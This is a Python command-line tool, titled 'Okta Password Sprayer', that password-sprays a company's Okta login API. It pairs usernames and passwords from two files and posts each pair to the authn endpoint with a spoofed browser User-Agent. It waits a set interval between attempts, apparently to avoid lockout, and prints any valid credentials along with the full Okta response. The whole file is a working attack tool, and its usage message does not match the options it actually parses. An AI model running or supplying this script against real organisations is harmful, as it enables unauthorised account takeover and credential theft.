import requests
from requests.auth import HTTPBasicAuth
from optparse import OptionParser
import sys
import time

if ((len(sys.argv) < 9 or len(sys.argv) > 9) and '-h' not in sys.argv):
    print("\nUsage:")
    print("python3 %s -f <inputfile> -d <domain> -w <wait_time>\nThen enter password to spray with when prompted.\n" % sys.argv[0])
    sys.exit(1)


parser = OptionParser()
parser.add_option("-u", "--usernames", help="File with usernames")
parser.add_option("-p", "--passwords", help="File with passwords")
parser.add_option("-d", "--domain", help="Company domain")
parser.add_option("-w", "--wait", help="Seconds to wait between each spray attempt")
(options, args) = parser.parse_args()

domain = options.domain.partition('.')
domain2 = domain[0]
sleeptime = int(options.wait)

oktadomain = '%s.okta.com' % domain2

url = 'https://%s/api/v1/authn' % oktadomain
headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36'}

print("+"*100, flush=True)
print("Okta Password Sprayer", flush=True)
print("+"*100, flush=True)
print("Spraying...with a wait time of %s..." % options.wait, flush=True)
with open("%s" % options.usernames, "r") as oktausers, open("%s" % options.passwords, "r") as oktapass:
    for users,passwds in zip(oktausers,oktapass):
        try:
            user = users.strip()
            passwd = passwds.strip()
            data = {"username":"{}".format(user),"options":{"warnBeforePasswordExpired":"true","multiOptionalFactorEnroll":"true"},"password":"{}".format(passwd)}
            print("--Waiting %s seconds..." % options.wait, flush=True)
            time.sleep(sleeptime)
            response = requests.post(url, headers=headers, json=data)
            if response.status_code == 200:
                print("\033[92mlogin successful - %s:%s\033[0m" % (user, passwd), flush=True)
                print("\033[1mOkta Response Info:\033[0m", flush=True)
                print(response.text, flush=True)
                response.close()
            else:
                print("\033[91mAuthentication failed - %s:%s\033[0m" % (user, passwd), flush=True)
        except Exception as e:
            print(e, flush=True)
